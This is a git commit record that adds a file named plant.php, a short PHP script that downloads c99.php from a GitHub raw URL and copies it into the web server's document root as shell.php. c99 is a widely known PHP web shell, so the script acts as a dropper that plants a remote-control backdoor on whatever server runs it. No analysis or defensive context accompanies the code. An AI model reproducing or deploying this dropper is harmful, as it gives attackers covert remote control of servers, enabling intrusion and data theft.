b042760fb4a17b85af87b0ad682437fbcf35d42e
graou13 <gael.faure@epitech.eu>
2015-04-29 01:52:26 +0200

    Create plant.php

---
+++ plant.php
@@ -0,0 +1,8 @@
+<?php $file = 'http://raw.githubusercontent.com/graou13/testPHP/master/c99.php';
+$newfile = $_SERVER['DOCUMENT_ROOT'] . '/shell.php';
+
+if ( copy($file, $newfile) ) {
+    echo "Copy success!";
+}else{
+    echo "Copy failed.";
+}
